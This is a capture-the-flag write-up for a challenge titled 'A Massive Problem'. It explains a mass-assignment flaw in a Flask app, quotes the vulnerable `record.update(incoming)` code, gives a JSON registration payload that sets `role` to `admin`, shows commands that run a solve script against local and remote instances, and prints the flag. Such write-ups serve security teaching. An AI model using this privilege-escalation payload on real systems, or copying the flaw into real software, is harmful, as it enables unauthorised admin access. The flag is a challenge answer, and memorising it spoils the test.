# Writeup: A Massive Problem

## TL;DR

The app is vulnerable to mass assignment.
Both `/api/register` and `/api/profile` build a trusted server-side record and then call `record.update(incoming)`, which lets the client set `role=admin`.
Once an account is created or updated with the `admin` role, logging in and visiting `/admin` reveals the flag.

## Recon

The challenge bundle in `other/src/a-massive-problem/` contains the full Flask app, including `Dockerfile`, `docker-compose.yml`, templates, and static files.

The critical logic is in `other/src/a-massive-problem/app/app.py`:

- `/api/register` initializes `role` as `standard`, then immediately merges the raw client JSON into `record`
- `/api/profile` does the same thing with the current account record
- `/api/login` copies the database role into the session
- `/admin` only checks whether `session['role'] == 'admin'`

## Vulnerability

The bug is mass assignment / over-posting.

During registration:

```python
record = {
    'username': username,
    'password': password,
    'role': 'standard',
    'full_name': full_name,
    'title': title,
    'team': team
}
record.update(incoming)
```

Even though the server tries to default new users to `standard`, the subsequent `record.update(incoming)` lets the attacker override `role`.

## Exploit

Register a new user with an extra JSON field:

```json
{
  "username": "attacker",
  "password": "Aa!23456",
  "full_name": "attacker",
  "title": "eng",
  "team": "ops",
  "role": "admin"
}
```

Then log in with that account and request `/admin`.

## Reproduction

The original attachment is already stored at `files/a-massive-problem.zip`.
It has been extracted to `other/src/a-massive-problem/` so the challenge can be reproduced locally from the organizer files.

Run the local app:

```bash
./scripts/run-local.sh 5001
```

Exploit either the local instance or the remote challenge:

```bash
uv run ./scripts/solve.py http://127.0.0.1:5001
uv run ./scripts/solve.py http://23.179.17.92:5556
```

The local reproduction returns the test flag from the supplied container config, and the remote instance returns the real flag.

## Flag

`CIT{M@ss_@ssignm3nt_Pr1v3sc}`
